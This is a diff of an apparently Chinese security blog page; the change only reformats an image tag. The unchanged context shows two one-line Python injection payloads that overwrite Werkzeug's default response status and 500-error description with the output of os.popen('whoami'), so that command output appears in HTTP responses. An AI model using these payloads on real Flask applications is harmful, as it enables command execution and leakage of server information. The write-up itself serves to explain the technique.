@@ -203,12 +203,7 @@
 <h2 id="状态码-1"><a href="#状态码-1" class="headerlink" title="状态码"></a>状态码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.wrappers <span class="keyword">import</span> Response; <span class="keyword">import</span> os; <span class="keyword">import</span> base64; <span class="built_in">setattr</span>(Response, <span class="string">&#x27;default_status&#x27;</span>, base64.b64encode(os.popen(<span class="string">&#x27;whoami&#x27;</span>).read().encode()).decode())</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321361.png" alt="image-20250124213243947"></p>
-<img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321376.png" alt="image-20250124213309765" style="zoom:67%;">
-
-
-
-
-
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321376.png" alt="image-20250124213309765"></p>
 <h2 id="500页面-1"><a href="#500页面-1" class="headerlink" title="500页面"></a>500页面</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.exceptions <span class="keyword">import</span> InternalServerError; <span class="keyword">import</span> os; <span class="built_in">setattr</span>(InternalServerError, <span class="string">&quot;description&quot;</span>, os.popen(<span class="string">&#x27;whoami&#x27;</span>).read().strip())</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321321.png" alt="image-20250124204943133"></p>
